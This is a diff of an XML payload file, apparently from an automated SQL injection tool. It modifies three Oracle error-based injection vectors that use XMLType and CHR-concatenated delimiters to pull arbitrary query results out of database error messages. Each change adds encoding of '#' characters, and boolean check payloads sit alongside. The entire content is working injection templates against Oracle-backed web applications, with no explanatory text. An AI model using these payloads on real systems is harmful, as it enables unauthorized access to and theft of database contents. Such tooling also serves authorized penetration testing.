@@ -593,7 +593,7 @@
         <risk>3</risk>
         <clause>1,9</clause>
         <where>2</where>
-        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -1256,7 +1256,7 @@
         <risk>1</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
@@ -1533,7 +1533,7 @@
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
             <payload>,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
